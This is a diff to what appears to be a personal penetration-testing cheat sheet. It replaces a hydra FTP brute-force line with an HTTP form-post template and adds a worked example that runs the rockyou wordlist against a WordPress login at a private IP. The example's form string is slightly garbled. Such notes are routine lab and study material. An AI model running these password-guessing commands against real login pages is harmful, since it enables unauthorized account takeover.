@@ -3,7 +3,7 @@
 -------------------------------------------------------------------------------------------
 
 `verison` 
-`1.0`
+`1.1`
 
 -------------------------------------------------------------------------------------------
 
@@ -122,10 +122,22 @@
 
 `hydra`
 
-	hydra -l user -P passlist.txt ftp://192.168.0.1
+
+        hydra -l user -P wordlists.txt {ip} -V http-form-post "page:parameters:string"
+
+
+
+`example:`
+
+
+        hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.208.134 -V http-form-post "wp-login.php:log=^USER^&^PASS^$wp-submit:LogIn&testcookie=1:F=incorrect"
+
+
+`use burpsuit for rest of info`
 
 
 -----------------------------------------------------------------------------------------------------
+
 
 `hashid`
 
